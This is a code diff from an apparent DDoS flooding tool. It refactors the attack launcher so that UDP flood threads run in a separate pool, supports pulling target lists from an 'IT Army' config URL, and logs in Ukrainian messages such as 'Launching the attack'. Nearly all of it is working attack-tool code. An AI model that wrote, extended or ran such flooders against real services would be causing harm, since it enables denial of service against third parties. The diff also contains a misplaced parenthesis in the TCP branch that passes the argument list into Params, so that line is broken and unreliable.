@@ -20,13 +20,14 @@ from src.system import fix_ulimits, is_latest_version
 from src.targets import Targets
 
 
+# XXX: no need to keep threads (just fix log message)
 Params = namedtuple('Params', 'target, method, threads')
 
 PAD_THREADS = 30
 
 TERMINATE = object()
 
-
+# XXX: do we need custom pool in case threads are only launched once?
 class DaemonThreadPool(Executor):
     def __init__(self):
         self._queue = queue.SimpleQueue()
@@ -65,6 +66,7 @@ class DaemonThreadPool(Executor):
                 work_item.run()
                 del work_item
 
+
 def thread_safe_cycle(kwargs_list):
     it = cycle(kwargs_list)
     lock = Lock()
@@ -92,63 +94,71 @@ class Flooder:
                 runnable.run()
 
 
-def run_ddos(thread_pool, proxies, targets, total_threads, period, rpc, http_methods, vpn_mode, debug, table):
+def run_ddos(
+    thread_pool,
+    udp_thread_pool,
+    proxies,
+    targets,
+    total_threads,
+    period,
+    rpc,
+    http_methods,
+    vpn_mode,
+    debug,
+    table
+):
     threads_per_target = total_threads // len(targets)
-    params_list = []
-    for target in targets:
-        assert target.is_resolved, "Unresolved target cannot be used for attack"
-        # udp://, method defaults to "UDP"
-        # XXX: UDP has to go on a separate thread pool
-        if target.is_udp:
-            params_list.append(Params(target, target.method or 'UDP', UDP_THREADS))
-        # Method is given explicitly
-        elif target.method is not None:
-            params_list.append(Params(target, target.method, threads_per_target))
-        # tcp://
-        elif target.url.scheme == "tcp":
-            params_list.append(Params(target, 'TCP', threads_per_target))
-        # HTTP(S), methods from --http-methods
-        elif target.url.scheme in {"http", "https"}:
-            threads = threads_per_target // len(http_methods)
-            for method in http_methods:
-                params_list.append(Params(target, method, threads))
-        else:
-            raise ValueError(f"Unsupported scheme given: {target.url.scheme}")
+    statistics, event, kwargs_list, udp_kwargs_list = {}, Event(), [], []
 
-    logger.info(f'{cl.YELLOW}Запускаємо атаку...{cl.RESET}')
-    statistics = {}
-    event = Event()
 
-    # XXX: refactor this code, no need to have 2 cycles
-    kwargs_list = []
-    for params in params_list:
+    def register_params(params, container):
         thread_statistics = {'requests': AtomicCounter(), 'bytes': AtomicCounter()}
         statistics[params] = thread_statistics
         kwargs = {
             'url': params.target.url,
             'ip': params.target.addr,
             'method': params.method,
-            'threads': 0,
-            # XXX: no need to carry this parameter 
-            #'threads': params.threads,
             'rpc': int(params.target.option("rpc", "0")) or rpc,
-            # XXX: no need to carry this parameter 
-            # 'thread_pool': thread_pool ,
-            'thread_pool': None,
             'event': event,
             'statistics': thread_statistics,
             'proxies': proxies,
         }
-        kwargs_list.append(kwargs)
-
+        container.append(kwargs)
         if not table:
+            # XXX: this message is not accurate now
             logger.info(
                 f"{cl.YELLOW}Атакуємо{cl.BLUE} %s{cl.YELLOW} методом{cl.BLUE} %s{cl.YELLOW}, потоків:{cl.BLUE} %d{cl.YELLOW}!{cl.RESET}"
                 % (params.target.url.host, params.method, params.threads))
 
+
+    for target in targets:
+        assert target.is_resolved, "Unresolved target cannot be used for attack"
+        # udp://, method defaults to "UDP"
+        if target.is_udp:
+            register_params(Params(target, target.method or 'UDP', UDP_THREADS), udp_kwargs_list)
+        # Method is given explicitly
+        elif target.method is not None:
+            register_params(Params(target, target.method, threads_per_target), kwargs_list)
+        # tcp://
+        elif target.url.scheme == "tcp":
+            register_params(Params(target, 'TCP', threads_per_target, kwargs_list))
+        # HTTP(S), methods from --http-methods
+        elif target.url.scheme in {"http", "https"}:
+            threads = threads_per_target // len(http_methods)
+            for method in http_methods:
+                register_params(Params(target, method, threads), kwargs_list)
+        else:
+            raise ValueError(f"Unsupported scheme given: {target.url.scheme}")
+
+    logger.info(f'{cl.YELLOW}Запускаємо атаку...{cl.RESET}')
+
     kwargs_iter = thread_safe_cycle(kwargs_list)
+    udp_kwargs_iter = thread_safe_cycle(udp_kwargs_list)
     for _ in range(total_threads):
         thread_pool.submit(Flooder(event, kwargs_iter))
+    if udp_kwargs_list:
+        for _ in range(UDP_THREADS):
+            udp_thread_pool.submit(Flooder(event, udp_kwargs_iter))
     event.set()
 
     if not (table or debug):
@@ -182,8 +192,12 @@ def start(args):
             )
 
     thread_pool = DaemonThreadPool()
+    udp_thread_pool = DaemonThreadPool()
     # It is possible that not all threads were started
     total_threads = thread_pool.start(args.threads)
+    # XXX: most likely we don't need more than a single UDP thread
+    # but this needs to be verified properly
+    udp_thread_pool.start(UDP_THREADS)
     if args.itarmy:
         targets_iter = Targets([], IT_ARMY_CONFIG_URL)
     else:
@@ -224,6 +238,7 @@ def start(args):
         period = 300
         run_ddos(
             thread_pool,
+            udp_thread_pool,
             proxies,
             targets,
             total_threads,
